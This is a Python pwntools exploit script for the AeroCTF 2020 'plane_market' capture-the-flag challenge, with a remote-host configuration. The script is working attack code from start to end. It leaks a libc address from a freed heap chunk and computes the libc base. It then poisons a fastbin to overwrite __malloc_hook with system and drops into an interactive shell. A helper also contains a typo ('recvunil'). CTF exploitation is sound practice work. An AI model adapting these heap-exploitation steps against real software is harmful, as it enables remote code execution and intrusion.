#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/aero2020/plane_market/'
config = {
        'elf': chdir + 'plane_market',
        'libc': chdir + 'libc.so.6',
        'HOST': 'tasks.aeroctf.com',
        'PORT': 33087
        }

def sell_plane(r, sz, name):
    r.sendlineafter('7. Exit\n> ', '1')
    r.sendlineafter('size:',str(sz))
    r.sendafter('name:',name)
    r.sendlineafter('cost:',str(0x6873))
    r.sendlineafter('[Y\N]:','N')

def delete_plane(r, idx):
    r.sendlineafter('7. Exit\n> ', '2')
    r.sendlineafter('id:',str(idx))

def view_list(r):
    r.sendlineafter('7. Exit\n> ', '3')
    r.recvuntil('---- Plane list ----')
    print r.recvunil('-------- Plane market --------')
    
def view_plane(r, idx):
    r.sendlineafter('7. Exit\n> ', '4')
    r.sendlineafter('id:',str(idx))

def change_name(r, idx, name):
    r.sendlineafter('7. Exit\n> ', '5')
    r.sendlineafter('id:',str(idx))
    r.sendafter('name:',name)

def exploit(r):
    r.sendlineafter(':', 'ke2ek') # name
    sell_plane(r, 0x4f0, 'a') # 0
    sell_plane(r, 0x60, 'b') # 1
    sell_plane(r, 0x4f0, 'c') # 2
    sell_plane(r, 0x30, 'd') # 3
    sell_plane(r, 0x60, 'e') # 4
    change_name(r, 4, 'a')
    sleep(1)
    delete_plane(r, 2)
    sleep(1)
    r.sendlineafter('7. Exit\n> ', '1')
    r.sendlineafter('size:','0')
    r.sendlineafter('cost:','1')
    r.sendlineafter('[Y\N]:','N')
    view_plane(r, 2)

    r.recvuntil('---- Plane [2] ----\nName: ')
    leak_addr = u64(r.recvn(6).ljust(8,'\x00'))
    libc.address = leak_addr - 0x1ba0d0
    target = libc.sym['__malloc_hook'] - 0x23 + 0x20
    log.info('leak addr: {:#x}'.format(leak_addr))
    log.info('libc base: {:#x}'.format(libc.address))
    log.info('target: {:#x}'.format(target))

    delete_plane(r, 1) # fastbin -> 1
    delete_plane(r, 4) # fastbin -> 4 -> 1
    change_name(r, 4, p64(target))
    sell_plane(r, 0x60, 'f') 

    r.sendlineafter('7. Exit\n>', '1')
    r.sendlineafter('size:',str(0x60))
    r.sendlineafter('name:',"\x7f\x00\x00" + p64(libc.sym['system']))
    r.sendlineafter('cost:','1')
    r.sendlineafter('[Y\N]:','N')

    r.sendlineafter('7. Exit\n>', '1')
    r.sendlineafter('size:',str(0x4040e8))
    pause()
    r.interactive()

if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    context.log_level = 'debug'

    if len(sys.argv) > 1:
        r = remote(config["HOST"], config["PORT"])
    else:
        context.terminal=['tmux', 'splitw', '-h']
        cmd = ['./ld-linux-x86-64.so.2', '--library-path', chdir, e.path]
        r = process(cmd)
        gdb.attach(r, gdbscript='''
                b *0x401192
        ''')
    exploit(r)

